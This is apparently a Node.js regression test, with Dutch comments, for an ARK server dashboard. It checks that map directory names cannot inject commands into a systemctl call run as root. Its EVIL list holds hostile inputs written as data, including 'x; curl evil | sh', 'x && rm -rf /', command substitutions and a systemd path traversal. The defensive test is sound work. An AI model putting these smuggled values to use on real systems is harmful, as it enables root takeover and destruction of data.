// Regressietest voor de mapnaam-validatie (audit 2026-08-16).
//
// Achtergrond: discoverMaps() nam de naam van een map-directory op de VM
// klakkeloos over. Die naam wordt `service` en werd ONGEQUOTE geinterpoleerd in
// `systemctl <actie> <service>` - een commando dat als ROOT over de qemu-guest-
// agent draait. Wie onder maps/ mocht schrijven (de onbevoorrechte arkadmin, en
// het dashboard heeft NOPASSWD op die gebruiker) kon zo root worden.
//
// Draaien:  node backend/test-map-name-guard.js
// Exit 0 = alles goed, exit 1 = regressie.

'use strict';

const assert = require('assert');
const { ArkInstance, discoverMaps } = require('./ark.js');

const arkCfg = {
  servicePrefix: 'ark-',
  user: 'arkadmin',
  manager: '/opt/ark-server/ark-manager.sh',
  ramAllocGB: 8,
};

const EVIL = [
  "x; curl evil | sh",
  "x && rm -rf /",
  "x$(id)",
  "x`id`",
  "../../etc/systemd/system/evil",
  "x y",
  "x'y",
  "x\ny",
];

let failed = 0;
function check(naam, fn) {
  try {
    fn();
    console.log(`  ok    ${naam}`);
  } catch (e) {
    console.error(`  FOUT  ${naam}: ${e.message}`);
    failed++;
  }
}

console.log('mapnaam-guard:');

// 1. De constructor moet elke gevaarlijke naam weigeren.
for (const naam of EVIL) {
  check(`constructor weigert ${JSON.stringify(naam)}`, () => {
    assert.throws(
      () => new ArkInstance({}, arkCfg, { display: naam }),
      /unsafe service name refused/,
    );
  });
}

// 2. Nette namen moeten gewoon blijven werken.
for (const naam of ['Extinction', 'TheIsland', 'Map_2', 'abc123']) {
  check(`constructor accepteert ${JSON.stringify(naam)}`, () => {
    const inst = new ArkInstance({}, arkCfg, { display: naam });
    assert.strictEqual(inst.service, `ark-${naam.toLowerCase()}`);
  });
}

// 3. discoverMaps() moet gevaarlijke dirnamen overslaan en nette behouden.
const fakePmx = {
  guestShell: async () => ({
    out: EVIL.map((n) => `===MAP:${n}===\nMapName=X_WP\n`).join('')
       + '===MAP:Extinction===\nMapName=Extinction_WP\n',
  }),
};

discoverMaps(fakePmx, arkCfg)
  .then((maps) => {
    const namen = maps.map((m) => m.display);
    check('discoverMaps houdt alleen de veilige naam over', () => {
      assert.deepStrictEqual(namen, ['Extinction']);
    });
    console.log(failed === 0 ? '\nALLES GOED' : `\n${failed} CONTROLE(S) MISLUKT`);
    process.exit(failed === 0 ? 0 : 1);
  })
  .catch((e) => {
    console.error('onverwachte fout:', e);
    process.exit(1);
  });
